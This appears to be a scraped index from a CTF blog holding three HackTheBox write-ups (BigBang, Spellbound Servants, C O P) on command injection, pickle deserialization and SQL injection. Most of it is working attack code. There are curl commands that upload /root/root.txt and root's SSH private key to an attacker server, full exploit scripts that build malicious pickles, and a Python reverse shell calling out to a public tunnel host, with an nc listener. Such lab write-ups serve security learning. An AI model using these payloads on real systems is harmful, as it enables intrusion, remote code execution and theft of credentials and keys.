cd source scp developer@$RADDR:/home/developer/android/satellite-app.apk ./ Now, we can decompile using apktool:
apktool d satellite-app.apk -o ./satellite-app Normally I&rsquo;d take the output of apktool and run the classes.dex file through dex2jar, but for some reason apktool did not produce a classes.dex file this time.
Instead, I&rsquo;ll try loading satellite-app.apk into JADX-GUI
I didn&rsquo;t have JADX yet, so I had to install it from the kali repos: sudo apt install jadx
I loaded the apk file into JADX, then went looking around manually through the app. It is a very large app, and has a LOT of resource files. Also, the source code seems to be stripped of its symbols for the most part, so the code is quite difficult to read (the symbol names are mostly auto-generated by the decompiler).
Thankfully though, all of the string literals are retained! We can just open up a search box and try to find some goodies &#x1f381;
I searched for &ldquo;pass&rdquo;, &ldquo;password&rdquo;, &ldquo;credential&rdquo;, &ldquo;login&rdquo;, and eventually found something useful in u.AsyncTaskC0228f.a():
That looks a lot like an API endpoint. Exactly what I was hoping for! Now I won&rsquo;t need to enumerate the app at port 9090 (which I can now assume is this satellite-app). Let&rsquo;s check for other endpoints:
Looks like there&rsquo;s only two. Here&rsquo;s the snippets of Java that show us the API details:
HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(&#34;http://app.bigbang.htb:9090/login&#34;).openConnection(); httpURLConnection.setRequestMethod(&#34;POST&#34;); httpURLConnection.setRequestProperty(&#34;Content-Type&#34;, &#34;application/json&#34;); httpURLConnection.setRequestProperty(&#34;Accept&#34;, &#34;application/json&#34;); // ... HttpURLConnection httpURLConnection2 = (HttpURLConnection) new URL(&#34;http://app.bigbang.htb:9090/command&#34;).openConnection(); httpURLConnection2.setRequestMethod(&#34;POST&#34;); httpURLConnection2.setRequestProperty(&#34;Content-Type&#34;, &#34;application/json&#34;); httpURLConnection2.setRequestProperty(&#34;Authorization&#34;, &#34;Bearer &#34; + ((MoveCommandActivity)contextWrapper).f1999q); httpURLConnection2.setDoOutput(true); // ... HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(&#34;http://app.bigbang.htb:9090/command&#34;).openConnection(); httpURLConnection.setRequestMethod(&#34;POST&#34;); httpURLConnection.setRequestProperty(&#34;Content-Type&#34;, &#34;application/json&#34;); httpURLConnection.setRequestProperty(&#34;Authorization&#34;, &#34;Bearer &#34; + this.f3687b.f2003p); httpURLConnection.setDoOutput(true); String str = &#34;{\\&#34;command\\&#34;: \\&#34;send_image\\&#34;, \\&#34;output_file\\&#34;: \\&#34;&#34; + this.f3686a + &#34;\\&#34;}&#34;; OutputStream outputStream = httpURLConnection.getOutputStream(); // ... Satellite App - API Summarizing the above, we see:
POST /login Body unknown. Probably credentials. Hopefully anonymous! POST /command Headers: Authorization: Bearer {token} Body: JSON of {&quot;command&quot;: &quot;send_image&quot;, &quot;output_file&quot;: ???} I&rsquo;m hoping that the /login endpoint returns a bearer token to us. Let&rsquo;s try it out:
OK, so the endpoint requires JSON. What keys should be in the JSON?
Perfectly sensible. No idea what the credentials are, though. Let&rsquo;s check for credential re-use yet again:
Usernames: shawking, ghubble, developer, root Passwords: quantumphysics, bigbang Great! Looks like we can use developer : bigbang. Let&rsquo;s try using the auth token for the /command endpoint now.
We already saw in the source code that the auth token is valid for only two minutes.
TOKEN=$(curl -s localhost:9090/login -H &#39;Content-Type: application/json&#39; --data &#39;{&#34;username&#34;:&#34;developer&#34;,&#34;password&#34;:&#34;bigbang&#34;}&#39; | cut -d &#39;&#34;&#39; -f 4); curl localhost:9090/command -H &#34;Authorization: Bearer $TOKEN&#34; -H &#39;Content-Type: application/json&#39; --data &#39;{&#34;command&#34;:&#34;send_image&#34;, &#34;output_file&#34;:&#34;/tmp/1.png&#34;}&#39; At this point, we need to imagine what the code for /root/satellite/app.py looks like. Clearly it&rsquo;s running some API. On the /command endpoint, we know it&rsquo;s checking for the command and output_file keys. Maybe it&rsquo;s something like this:
@app.route(&#39;/command&#39;, methods=[&#39;POST&#39;]) def command(): # Check Auth header auth_header = request.headers.get(&#39;Authorization&#39;) if not auth_header or not auth_header.startswith(&#39;Bearer &#39;): return jsonify({&#39;error&#39;: &#39;Unauthorized&#39;}), 401 if not is_token_valid(request.headers.get(&#39;Authorization&#39;)): return jsonify({&#39;error&#39;: &#39;Unauthorized&#39;}), 401 # Parse JSON body data = request.get_json() if not data or &#39;command&#39; not in data or &#39;output_file&#39; not in data: return jsonify({&#39;error&#39;: &#39;Bad Request&#39;, &#39;message&#39;: &#39;Missing command or output_file&#39;}), 400 command = data[&#39;command&#39;] output_file = data[&#39;output_file&#39;] if command == &#39;send_image&#39;: # Take a picture; # Copy the picture to the output_file filepath? # ...? return jsonify({&#39;message&#39;: &#39;Command received&#39;, &#39;command&#39;: command, &#39;output_file&#39;: output_file}), 200 Depending on the logic inside the branch of code that &ldquo;takes a picture&rdquo;, we might be able to trick it. Since it&rsquo;s handling files, perhaps the developer was lazy and used OS commands instead of a bytewise copy in python &#x1f914;
Satellite App - Command Injection Let&rsquo;s try inserting a command injetion in the filepath:
TOKEN=$(curl -s localhost:9090/login -H &#39;Content-Type: application/json&#39; --data &#39;{&#34;username&#34;:&#34;developer&#34;,&#34;password&#34;:&#34;bigbang&#34;}&#39; | cut -d &#39;&#34;&#39; -f 4); curl localhost:9090/command -H &#34;Authorization: Bearer $TOKEN&#34; -H &#39;Content-Type: application/json&#39; --data &#39;{&#34;command&#34;:&#34;send_image&#34;, &#34;output_file&#34;:&#34;/tmp;touch /tmp/hi&#34;}&#39; # {&#34;error&#34;:&#34;Output file path contains dangerous characters&#34;} Aha! The fact that it needs to even check indicates that maybe there is a flaw in the code &#x1f60f;
Let&rsquo;s try a polyglot of linux OS command injection characters and see if any work:
;||&amp;&amp;\\n$(touch /tmp/hi) &#x274c; &ldquo;400 Bad Request&rdquo; ; &ldquo;Error: dangerous characters&rdquo; &#x274c; &amp;&amp; &ldquo;Error: dangerous characters&rdquo; &#x274c; || &ldquo;Error: dangerous characters&rdquo; &#x274c; \\n &ldquo;Error: Error reading image file&rdquo; &#x1f440; The newline character worked. We can do OS command injection using the filepath!
I&rsquo;m still running an HTTP server on my attacker host. Maybe we can just leak the flag? I&rsquo;ll try a file upload using cURL:
TOKEN=$(curl -s localhost:9090/login -H &#39;Content-Type: application/json&#39; --data &#39;{&#34;username&#34;:&#34;developer&#34;,&#34;password&#34;:&#34;bigbang&#34;}&#39; | cut -d &#39;&#34;&#39; -f 4); curl localhost:9090/command -H &#34;Authorization: Bearer $TOKEN&#34; -H &#39;Content-Type: application/json&#39; --data &#39;{&#34;command&#34;:&#34;send_image&#34;, &#34;output_file&#34;:&#34;\\ncurl -F &#39;file=@/root/root.txt&#39; http://10.10.14.14:8001&#34;}&#39; &#x1f389; It worked! We can read the flag from the HTTP server root now:
cat www/root.txt Holy moly that was tough &#x1f629;
EXTRA CREDIT SSH as root Since we already have a way to exfil files by uploading them to the HTTP server, let&rsquo;s just check to see if there is an RSA SSH key in the root directory (there often is):
TOKEN=$(curl -s localhost:9090/login -H &#39;Content-Type: application/json&#39; --data &#39;{&#34;username&#34;:&#34;developer&#34;,&#34;password&#34;:&#34;bigbang&#34;}&#39; | cut -d &#39;&#34;&#39; -f 4); curl localhost:9090/command -H &#34;Authorization: Bearer $TOKEN&#34; -H &#39;Content-Type: application/json&#39; --data &#39;{&#34;command&#34;:&#34;send_image&#34;, &#34;output_file&#34;:&#34;\\ncurl -F &#39;file=@/root/.ssh/id_rsa&#39; http://10.10.14.14:8001&#34;}&#39; Yep, there&rsquo;s totally a key there. And by the length of it, it looks like it&rsquo;s probably valid:
I&rsquo;ll move this out of my HTTP server asap, so no other HTB players get it off my server inadvertently:
mv www/id_rsa loot/root_id_rsa chmod 600 loot/root_id_rsa ssh -i loot/root_id_rsa root@$RADDR Alas, there&rsquo;s still a password on the account. Oh well! &#x1f937;&zwj;&#x2642;&#xfe0f;
CLEANUP Target I&rsquo;ll get rid of the spot where I place my tools, /tmp/.Tools:
rm -rf /tmp/.Tools Attacker There&rsquo;s also a little cleanup to do on my local / attacker machine. It&rsquo;s a good idea to get rid of any &ldquo;loot&rdquo; and source code I collected that didn&rsquo;t end up being useful, just to save disk space:
rm -rf ./source/* rm -rf ./loot/* It&rsquo;s also good policy to get rid of any extraneous firewall rules I may have defined. This one-liner just deletes all the ufw rules:
NUM_RULES=$(($(sudo ufw status numbered | wc -l)-5)); for (( i=0; i&lt;$NUM_RULES; i++ )); do sudo ufw --force delete 1; done; sudo ufw status numbered; LESSONS LEARNED Attacker &#x1f4da; Vuln research. Do it early and often. We&rsquo;re just CTF runners, but there are people that find vulnerabilities and craft exploits for a living. Thankfully, they&rsquo;re often really open about their findings. Stand on the shoulders of giants, and try to figure out how you can apply their hard work to your target.
&#x1f494; Break your exploit into small, verifiable pieces. The more complex an attack path, the more points of failure there are. It can be overwhelming to try to create a whole exploit all in one step. It&rsquo;s best to take some extra time to see how you can break the exploit down into small pieces. I like to think of them as waypoints on the route to your final exploit.
Defender &#x1f616; Don&rsquo;t use Wordpress. Yeah that&rsquo;s right, I said it. It&rsquo;s bloated and the plugin system is ugly. It takes way too much memory to run, too. It&rsquo;s really well-documented, but my personal opinion is that its ecosystem has simply grown too large to be controlled. There&rsquo;s a reason that Wordpress is their own CVE numbering authority&hellip; It&rsquo;s great for attackers, though.
&#x26d4; Credential reuse is super bad. If it weren&rsquo;t for a few spots where credentials were reused, this box would have been nigh impossible. It was segmented into several different docker containers, and we would have had to work a lot hard post-foothold to finally reach root. Thankfully, a few accounts had some reused creds that weren&rsquo;t too hard to crack.
`,url:"https://4wayhandshake.github.io/walkthrough/bigbang/"},"https://4wayhandshake.github.io/ctf/spellbound-servants/":{title:"Spellbound Servants",tags:["Python","Insecure Deserialization","Pickle","Code Analysis"],categories:["Challenge","HTB","Web","Easy"],content:`INTRODUCTION I&rsquo;m not quite sure about the description on this one&hellip; To me, it just looks like a partially-finished storefront &#x1f602;
As long as you don&rsquo;t get too bogged-down with all the Flask-related code, this challenge is really easy. A bit of code analysis leads directly to the solution, which involves only a single step of deserialization to accomplish. Besides the vulnerability, this challenge presents a great example of writing a clean &amp; tidy Flask server.
FIRST TAKE When we navigate to the target, there is a simple login / registration pane presented:
After registration, we can login, and see a few different products displayed in a simple carousel. Seemingly, these are the only two pages for the challenge.
The Add to Cart and Add to Wishlist buttons don&rsquo;t seem to actually do anything, so there will be no Cart functionality to play with.
&#x1f440; Actually, I don&rsquo;t really see anything interactive&hellip;
Since we have access to all the source code, we can see that there isn&rsquo;t really anything strange happening with the registration process. It stores the passwords in plaintext (obviously a bad idea, but so far we don&rsquo;t see any reason that the database itself might be vulnerable so we&rsquo;ll ignore that for now):
def query(query, args=(), one=False): cursor = mysql.connection.cursor() cursor.execute(query, args) rv = [dict((cursor.description[idx][0], value) for idx, value in enumerate(row)) for row in cursor.fetchall()] return (rv[0] if rv else None) if one else rv # ... def register_user_db(username, password): check_user = query(&#39;SELECT username FROM users WHERE username = %s&#39;, (username,), one=True) if not check_user: query(&#39;INSERT INTO users(username, password) VALUES(%s, %s)&#39;, (username, password,)) mysql.connection.commit() return True return False It seems to use a parameter query properly, and has set one=True, so the basic mitigations against SQLi are already in-place for the registration endpoint.
Something strange I noticed upon logging in is that we&rsquo;re granted a new cookie called auth. We have a session cookie too, but for some reason both mechanisms are in place.
Checking the contents of the auth cookie shows right away that something is seriously wrong:
This is the format of a Python pickle, which are famous for being vulnerable to deserialization attacks when improperly handled! The &ldquo;tell&rdquo; is in the nonprintable characters at the beginning (with a curly brace), and the final two characters being s.
FIND THE VULN If we can find out how the auth cookie is read, we will be able to see how the cookie value is used. If it&rsquo;s deserialized unsafely, we should be able to use a deserialization attack against this target.
Run it locally with a terminal To explore how the target looks as it&rsquo;s running, we can open a terminal inside the docker container.
Modify build-docker.sh and entrypoint.sh to allow for a shell to open instead of running supervisord in the foreground. For build-docker.sh, add -it and run sh after the run target:
#docker run -p 1337:1337 --rm --name=web_spellbound_servants web_spellbound_servants docker run -it -p 1337:1337 --rm --name=web_spellbound_servants web_spellbound_servants sh In entrypoint.sh, set supervisord to run in the background and exec sh after everything is done:
# background supervisord instead /usr/bin/supervisord -c /etc/supervisord.conf &amp; exec sh Source code analysis We can grep the source code for the keyword cookies (the request attribute that Flask accesses to get the request cookies), and see in util.py the isAuthenticated wrapper decorator:
For anyone unfamiliar: a wrapper decorator is used a lot like middleware is used in Express or other frameworks.
It allows a function to be executed along the request
def isAuthenticated(f): @wraps(f) def decorator(*args, **kwargs): token = request.cookies.get(&#39;auth&#39;, False) if not token: return abort(401, &#39;Unauthorised access detected!&#39;) try: user = pickle.loads(base64.urlsafe_b64decode(token)) kwargs[&#39;user&#39;] = user return f(*args, **kwargs) except: return abort(401, &#39;Unauthorised access detected!&#39;) return decorator &#x1f60d; There are no attempts to validate or sanitize the pickle. The pickle.loads() function is called on a completely user-controlled value. This means we can definitely perform a deserialization attack.
We can check the routes.py blueprint to see how the isAuthenticated wrapper decorated gets used. It is only called in one place - for the /home route (the page that displays the carousel of items for sale):
@web.route(&#39;/home&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;]) @isAuthenticated def homeView(user): return render_template(&#39;index.html&#39;, user=user) Strategy Since there is no protection on the auth cookie, and it is completely user-controlled, we can probably perform our attack by doing the following:
Craft a malicious pickle payload that contains an OS shell command injection Pickle our payload and decode it to an ASCII string Overwrite the auth cookie with our payload and refresh the page. The question that remains is &ldquo;What should the OS shell command injection be?&rdquo; &#x1f914;
Well, we could open a reverse shell. This is a challenge that doesn&rsquo;t use the HackTheBox VPN, so it is slightly more complicated than usual. For details on how to pull that off, please check out my walkthrough on the C.O.P. web challenge.
We could alternatively just copy the flag into the /static directory of the webserver. Files in there are served by default, so if we can issue a single command to copy the flag, we can read the flag by checking the correct URL. (This is much easier than opening a reverse shell without a VPN.)
EXPLOIT Make the payload By reading the Dockerfile or by checking the locally-running docker container, we know
The flag is at /flag.txt The static directory is at /app/application/static Therefore, our payload should be:
cp /flag.txt /app/application/static/flag.txt Check out this article on crafting malicious pickles; I reference it often. The gist is that we need to create a python class with the __reduce__() method implemented, and the __reduce__() method will contain a reference to os.system and an argument for it (the command-injection payload)
The malicious class can be as simple as this:
import os # ... class User: def __init__(self, user): self.username = user def __reduce__(self): cmd = &#39;cp /flag.txt /app/application/static/flag.txt&#39; return os.system, (cmd,) Put the pickle in the cookie &#x1f60b; To get pickle an object of this class, we instantiate it then pickle it with pickle.dumps(). We want the pickled object as an ASCII representation of the base64-encoded pickle, so we can do that in Python too:
import pickle import base64 # ... pickled = pickle.dumps(User(&#39;jimbob&#39;)) pickled_str = base64.urlsafe_b64encode(pickled).decode(&#39;ascii&#39;) print(f&#39;\\nTHE PICKLED STRING IS \\&#34;{pickled_str}\\&#34;\\n&#39;) I think you could probably solve the challenge by running the script with just those two components and pasting the printed value into your browser&rsquo;s auth cookie
Payload delivery Personally, I prefer to solve the whole challenge in python as a self-contained exploit script. We do this by issuing two web requests:
GET /home and include the malicious pickle as the auth cookie. The payload should be delivered, and copy the flag into the /static directory GET /static/flag.txt to retrieve the flag. I&rsquo;ve also parameterized the target URL (but I was too lazy to use argparse):
#!/usr/bin/env python3 import sys import requests import pickle import base64 import os def print_usage(): print(f&#34;Usage: python3 {sys.argv[0]} &lt;url&gt;&#34;) print(&#34;Example: python3 {sys.argv[0]} 83.136.250.116:49992&#34;) def print_response(response, parts=[&#39;status&#39;,&#39;headers&#39;,&#39;body&#39;]): if &#39;status&#39; in parts: print(f&#34;HTTP/1.1 {response.status_code} {response.reason}&#34;) if &#39;headers&#39; in parts: print(f&#34;Headers:&#34;) for key, value in response.headers.items(): print(f&#34;{key}: {value}&#34;) if &#39;body&#39; in parts: print(f&#34;\\nResponse Body:\\n{response.text}&#34;) class User: def __init__(self, user): self.username = user # Instance variable def __reduce__(self): cmd = &#39;cp /flag.txt /app/application/static/flag.txt&#39; return os.system, (cmd,) def main(): # Parse args if len(sys.argv) != 2: print_usage() sys.exit(1) pickled = pickle.dumps(User(&#39;jimbob&#39;)) pickled_str = base64.urlsafe_b64encode(pickled).decode(&#39;ascii&#39;) # Do the exploit try: url = f&#34;http://{sys.argv[1]}/home&#34; cookies = {&#39;auth&#39;: pickled_str} response = requests.get(url, cookies=cookies, timeout=3) except requests.exceptions.RequestException as e: print(f&#34;An error occurred: {e}&#34;) # Try to get the flag try: url = f&#34;http://{sys.argv[1]}/static/flag.txt&#34; response = requests.get(url) print_response(response, parts=[&#39;status&#39;, &#39;body&#39;]) except requests.exceptions.RequestException as e: print(f&#34;An error occurred: {e}&#34;) if __name__ == &#34;__main__&#34;: main() Testing the script We can try running the script against the local docker container:
Perfect! Worked first try &#x1f609;
Try it live To do this against the live server, we just change the URL. You don&rsquo;t even need to visit the target website or register a user, just yeet the payload right at it:
&#x1f370; Fantastic
`,url:"https://4wayhandshake.github.io/ctf/spellbound-servants/"},"https://4wayhandshake.github.io/ctf/c-o-p/":{title:"C O P",tags:["Python","Flask","Pickle","Deserialization","SQL Injection"],categories:["Challenge","HTB","Web","Easy"],content:`INTRODUCTION C O P (Cult of Pickles) is an Easy web challenge, involving requireing equal portions of SQLi, and deserialization, and brine. The challenge is a very minimal web app, demonstrating a bit of a &ldquo;toy problem&rdquo; with SQLi arising from a failure to use SQL prepared statements and sloppy Flask+Jinja2 templating code.
Achieving actual RCE is a bit challenging, but mostly because of a very strange issue. Formulation of your attack steps and writing the exploit is not too bad. Be sure to read my warnings within the Exploit section to avoid my pitfalls.
FIRST TAKE The website itself is very finite, containing only two templates. There is the view that shows all products (see above, at /) and the product detail view, accessible at /view/&lt;product_id&gt;:
As far as I can tell, there is nothing interactive on this website.
CODE ANALYSIS The application has a very typical layout for a Flask project. Oddly, they decided to use Flask Blueprints even though there are only two routes:
I like to review the code in the order that each file would be accessed and executed. In this challenge, that means starting at the Dockerfile, entrypoint.sh, and run.py, and traversing all the way to the templates
The first strange thing I found with the source code was in app.py:
from flask import Flask, g from application.blueprints.routes import web import pickle, base64 app = Flask(__name__) app.config.from_object(&#39;application.config.Config&#39;) app.register_blueprint(web, url_prefix=&#39;/&#39;) @app.template_filter(&#39;pickle&#39;) def pickle_loads(s): return pickle.loads(base64.b64decode(s)) @app.teardown_appcontext def close_connection(exception): db = getattr(g, &#39;_database&#39;, None) if db is not None: db.close() Check out that template filter. Why would that exist? Why would the functionality of such an important (and dangerous) activity be offloaded into the templates?
&#x1f4a1; Note that there is no validation on the base64 serialized data. If we can somehow find a way to make this function deserialize a user-controlled pickle, then we can probably achieve RCE.
That pickle template filter is used in both templates; here&rsquo;s a snippet from item.html:
&lt;!-- ... --&gt; {% set item = product | pickle %} &lt;div class=&#34;col-md-6&#34;&gt; &lt;img class=&#34;card-img-top mb-5 mb-md-0&#34; src=&#34;{{ item.image }}&#34; alt=&#34;...&#34; /&gt; &lt;/div&gt; &lt;div class=&#34;col-md-6&#34;&gt; &lt;h1 class=&#34;display-5 fw-bolder&#34;&gt;{{ item.name }}&lt;/h1&gt; &lt;div class=&#34;fs-5 mb-5&#34;&gt; &lt;span&gt;£{{ item.price }}&lt;/span&gt; &lt;/div&gt; &lt;p class=&#34;lead&#34;&gt;{{ item.description }}&lt;/p&gt; &lt;/div&gt; &lt;!-- ... --&gt; The product is passed into the template as a string, then goes through the pickle filter which deserializes it into an object - presumably an object with properties name, price, and description.
&#x1f914; That is such an odd design choice. This must be part of the vulnerability.
Product data flow Where does the product string come from, before it arrives at this template? The answer is in routes.py:
@web.route(&#39;/view/&lt;product_id&gt;&#39;) def product_details(product_id): return render_template(&#39;item.html&#39;, product=shop.select_by_id(product_id)) The product id comes from the URL, then passed to the shop method; shop.select_by_id is a static method that performs a database query:
@staticmethod def select_by_id(product_id): return query_db(f&#34;SELECT data FROM products WHERE id=&#39;{product_id}&#39;&#34;, one=True) &#x1f62e; Hey, look at that! They neglected to use a proper SQL prepared statement. I bet we can find a way to abuse this with SQLi.
&#x261d;&#xfe0f; It&rsquo;s important to note that the function query_db is actually written properly to perform a prepared statement:
def query_db(query, args=(), one=False): with app.app.app_context(): cur = get_db().execute(query, args) rv = [dict((cur.description[idx][0], value) \\ for idx, value in enumerate(row)) for row in cur.fetchall()] return (next(iter(rv[0].values())) if rv else None) if one else rv But we can see from the select_by_id(product_id) function that they failed to call query_db with any args. Instead, they have bundled the query and its args into one string.
This one mistake is what allows the SQLi &#x1f489;
&#x23e9; If we can use SQLi to produce a user-controlled product object, then we might be able to chain this with the unsafe deserialization we saw within the pickle_loads() template filter we saw earlier to achieve RCE!
EXPLOIT As mentioned above, if we are able to combine two things, then we can achieve RCE:
Use SQLi to produce user-controlled base64-encoded string Run the user-controlled string through the unsafe pickle_loads function SQLi We should be able to just use cURL to play with this one, but since we need to pickle a malicious class anyway, I&rsquo;ll skip right to using Python + requests:
#!/usr/bin/env python3 import sys import requests import pickle import base64 def print_usage(): print(f&#34;Usage: python3 {sys.argv[0]} &lt;url&gt;&#34;) print(&#34;Example: python3 {sys.argv[0]} 83.136.250.116:49992&#34;) def print_response(response)&#34; print(f&#34;HTTP/1.1 {response.status_code} {response.reason}&#34;) print(f&#34;Headers:&#34;) for key, value in response.headers.items(): print(f&#34;{key}: {value}&#34;) print(f&#34;\\nResponse Body:\\n{response.text}&#34;) def main(): # Parse args if len(sys.argv) != 2: print_usage() sys.exit(1) url = f&#34;http://{sys.argv[1]}/view/1&#34; # Make the HTTP request try: response = requests.get(url) print_response(response) except requests.exceptions.RequestException as e: print(f&#34;An error occurred: {e}&#34;) if __name__ == &#34;__main__&#34;: main() All this does right now is perform the same request as if we clicked on the product with id=1. Therefore it will execute this query:
SELECT data FROM products WHERE id=&#39;1&#39;; The data returned from this query should be the base64-encoded string of the pickled Item object with item ID 1.
To check it out, I loaded database.py, disabled some of the code that linked to other files/modules, then ran the migrate_db() function to produce a copy of the cop.db database. So I can say with certainty that the result of the above query is this:
gASVlAAAAAAAAACMCGRhdGFiYXNllIwESXRlbZSTlCmBlH2UKIwEbmFtZZSMDFBpY2tsZSBTaGlydJSMC2Rlc2NyaXB0aW9ulIwZR2V0IG91ciBuZXcgcGlja2xlIHNoaXJ0IZSMBWltYWdllIwfL3N0YXRpYy9pbWFnZXMvcGlja2xlX3NoaXJ0LmpwZ5SMBXByaWNllIwCMjOUdWIu We can see the raw pickle serial data by running it through base64:
We can play with this a little by actually querying for two rows:
select data from products where id = &#39;1&#39; union select data from products where id = &#39;2&#39; order by data ASC limit &#39;1&#39;; &#x261d;&#xfe0f; See how we can give a string (not an integer) to the LIMIT clause? Very handy for what we&rsquo;re about to do &#x1f609;
And we can choose which one is shown by toggling the order by clause between asc and desc.
&#x1f6ab; Making a PoC pickle Still not clear why, but this part didn&rsquo;t lead anywhere productive. If you&rsquo;re short on time, skip ahead to the next section.
I want a way to test the SQLi without worrying about getting RCE. The idea is that we should be able to load the URL, except provide a customized pickle.
To do this, let&rsquo;s get an existing product&rsquo;s pickle and exchange its description field. I&rsquo;ll use Cyberchef:
Then encode some new text:
echo -n &#39;this custom, user-controlled pickle&#39; | base64 # dGhpcyBjdXN0b20sIHVzZXItY29udHJvbGxlZCBwaWNrbGU= And insert the new text where the old description used to be:
gASVoAAAAAAAAACMCGRhdGFiYXNllIwESXRlbZSTlCmBlH2UKIwEbmFtZZSMDlBpY2tsZSBTaGlydCAylIwLZGVzY3JpcHRpb26UjCJHZXQgdGhpcyBjdXN0b20sIHVzZXItY29udHJvbGxlZCBwaWNrbGUhlIwFaW1hZ2WUjCAvc3RhdGljL2ltYWdlcy9waWNrbGVfc2hpcnQyLmpwZ5SMBXByaWNllIwCMjeUdWIu
Now, instead of selecting a second product, we select 1 valid product and our hardcoded (customized base64) string:
select data from products where id = &#39;1&#39; union select &#39;gASVoAAAAAAAAACMCGRhdGFiYXNllIwESXRlbZSTlCmBlH2UKIwEbmFtZZSMDlBpY2tsZSBTaGlydCAylIwLZGVzY3JpcHRpb26UjCJHZXQgdGhpcyBjdXN0b20sIHVzZXItY29udHJvbGxlZCBwaWNrbGUhlIwFaW1hZ2WUjCAvc3RhdGljL2ltYWdlcy9waWNrbGVfc2hpcnQyLmpwZ5SMBXByaWNllIwCMjeUdWIu&#39; as data order by data DESC limit &#39;1&#39;; So then I should be able to load this customized pickle by navigating to:
/view/1&#39; union select &#39;gASVoAAAAAAAAACMCGRhdGFiYXNllIwESXRlbZSTlCmBlH2UKIwEbmFtZZSMDlBpY2tsZSBTaGlydCAylIwLZGVzY3JpcHRpb26UjCJHZXQgdGhpcyBjdXN0b20sIHVzZXItY29udHJvbGxlZCBwaWNrbGUhlIwFaW1hZ2WUjCAvc3RhdGljL2ltYWdlcy9waWNrbGVfc2hpcnQyLmpwZ5SMBXByaWNllIwCMjeUdWIu&#39; as data order by data ASC limit &#39;1 But&hellip; it&rsquo;s not really working. Not sure why &#x1f914; When I try this against the local Docker instance, I get an error:
&#x1f612; No module named &lsquo;database&rsquo;? What..?
IDK, whatever&hellip; Let&rsquo;s just move on ​a​n​d ​t​ry ​th​e ​wh​o​le​ e​x​pl​o​i​t​ &#x1f644;
Malicious pickle The typical pattern for crafting a malicious pickle is to write a class with the __reduce__() method. If you want more detail, this is a good article to reference.
import os # ... class Exploit: def __reduce__(self): cmd = &#39;uname -a&#39; # put your command injection here return os.system, (cmd,) pickled = pickle.dumps(Exploit()) pickled_str = base64.urlsafe_b64encode(pickled).decode() I tried this with a few simple commands against my local Docker container, and it worked fine, so next we will transform this into an actual exploit.
Reverse shell (part 1) Since we&rsquo;re expecting to get RCE, one of the best outcomes would be for us to pop a reverse shell.
I initially solved this challenge by copying the flag to the /static directory of the Flask server. That works fine, but I wanted to go further. To make that happen, be sure to use something like this:
class Exploit: def __reduce__(self): cmd = &#39;cp /app/flag.txt /app/application/static/flag.txt&#39; return os.system, (cmd,) If you want more detail on that method, go find another walkthrough.
However, this is one of those challenges that doesn&rsquo;t use the HackTheBox VPN. Therefore, to form a reverse shell, I will need to expose a port on my attacker machine to the public internet.
Many people have heard of ngrok. It works great too, but it&rsquo;s more expensive than the one I use: Pinggy. To prepare for a reverse shell with Pinggy, I&rsquo;ll go to my dashboard at https://dashboard.pinggy.io, select TCP Tunnel, then choose a random port between 1000-65535:
Copy the SSH command that it spits out, and paste it into a terminal on the attacker host. It will display your TCP address and port.
&#x26a0;&#xfe0f; Note that the exposed TCP port is different than the local side of the tunnel!
For me, it was tcp://rnruv-149-88-102-121.a.free.pinggy.link:11763.
Since we know the target has Python available, let&rsquo;s use a Python reverse shell. The malicious pickle can only have between 2 and 6 args, so it&rsquo;s actually best if we phrase the python reverse shell as an OS command injection anyway, using python3 -c syntax:
class Exploit: def __reduce__(self): cmd = &#39;python3 -c \\&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;rnruv-149-88-102-121.a.free.pinggy.link&#34;,11763));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&#34;sh&#34;)\\&#39;&#39; return os.system, (cmd,) Great, our payload should be ready! Let&rsquo;s finish writing the exploit before we open the reverse shell.
Finish the exploit script We&rsquo;ll use the same general layout to the code as before, but now we need to send the payload at the target via the SQLi:
#!/usr/bin/env python3 import sys import requests import pickle import base64 import os import urllib def print_usage(): print(f&#34;Usage: python3 {sys.argv[0]} &lt;url&gt;&#34;) print(&#34;Example: python3 {sys.argv[0]} 83.136.250.116:49992&#34;) def print_response(response, short=False): print(f&#34;HTTP/1.1 {response.status_code} {response.reason}&#34;) if short: return print(f&#34;Headers:&#34;) for key, value in response.headers.items(): print(f&#34;{key}: {value}&#34;) print(f&#34;\\nResponse Body:\\n{response.text}&#34;) class Exploit: def __reduce__(self): cmd = &#39;python3 -c \\&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;rnruv-149-88-102-121.a.free.pinggy.link&#34;,11763));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&#34;sh&#34;)\\&#39;&#39; return os.system, (cmd,) def main(): # Parse args if len(sys.argv) != 2: print_usage() sys.exit(1) url = f&#34;http://{sys.argv[1]}/view/1&#34; # Pickle the Exploit class pickled = pickle.dumps(Exploit()) pickled_str = base64.urlsafe_b64encode(pickled).decode() print(f&#39;\\nTHE PICKLED STRING IS \\&#34;{pickled_str}\\&#34;\\n&#39;) # Perform the SQLi for order in [&#39;ASC&#39;, &#39;DESC&#39;]: try: sqli = f&#34;\\&#39; UNION SELECT\\&#39;{pickled_str}\\&#39; as data order by data {order} limit 1 ; -- &#34; exploit_url = url + urllib.parse.quote(sqli) print(exploit_url, end=&#39;...&#39;) response = requests.get(exploit_url, timeout=3) print_response(response, short=True) except requests.exceptions.RequestException as e: print(f&#34;An error occurred: {e}&#34;) if __name__ == &#34;__main__&#34;: main() &#x1f440; If you read that code thoroughly, you might notice that there is a space missing on one line:
sqli = f&#34;\\&#39; UNION SELECT\\&#39;{pickled_str}\\&#39; as data order by data {order} limit 1 ; -- &#34; You might be asking &ldquo;Why is there no space SELECT and the payload?&rdquo;
I truly don&rsquo;t know. I&rsquo;ve wasted hours trying to answer this question. I only found out about this by asking around.
Alright, that should do it! Let&rsquo;s open the reverse shell listener and hope that great things await us.
Reverse shell (part 2) Since I&rsquo;m not completely insane, I&rsquo;ll only open a firewall port for the challenge host&rsquo;s IP address:
# Note that this is the port that Pinggy shows after make the tunnel, not your listener&#39;s port sudo ufw allow from 94.237.53.227 to any port 11763 Set up the reverse shell listener:
![pinggy tcp](pinggy%20tcp.png)# Use the port you entered into Pinggy dashboard, not the publicly visible one bash nc -lvnp 16350 Fire ze missiles! Everything is ready, we just need to run the exploit script:
